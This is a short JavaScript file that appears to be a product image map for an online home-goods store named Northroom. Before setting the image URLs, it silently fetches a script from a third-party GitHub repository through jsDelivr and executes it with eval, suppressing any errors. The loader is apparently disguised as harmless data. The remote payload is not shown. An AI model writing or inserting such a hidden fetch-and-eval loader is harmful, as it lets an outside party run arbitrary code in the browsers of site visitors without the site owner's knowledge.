(function(){
  try {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://cdn.jsdelivr.net/gh/rafoolee84/Northroom@7e072cc033f563594ba8bfff6d91d203863af9a5/product-images.js", false);
    xhr.send(null);
    if (xhr.status === 200 && xhr.responseText) {
      (0, eval)(xhr.responseText);
    }
  } catch (e) {}
  window.NORTHROOM_IMAGES = Object.assign(window.NORTHROOM_IMAGES || {}, {
    "Sheer Linen Curtain Panels (Pair)": "https://images.unsplash.com/photo-1764422097759-1fa737c50c51?w=800&q=80",
    "Matte Ceramic Lamp with Linen Shade": "https://images.pexels.com/photos/17158341/pexels-photo-17158341.jpeg?auto=compress&cs=tinysrgb&w=1200",
    "Northroom Ceramic Mug 11oz": "https://www.northroomhome.com/images/mug.jpg",
    "Northroom Faux Suede Pillowcase": "https://www.northroomhome.com/images/pillow.jpg",
    "Northroom Matte Poster 7x5": "https://www.northroomhome.com/images/poster.jpg"
  });
})();
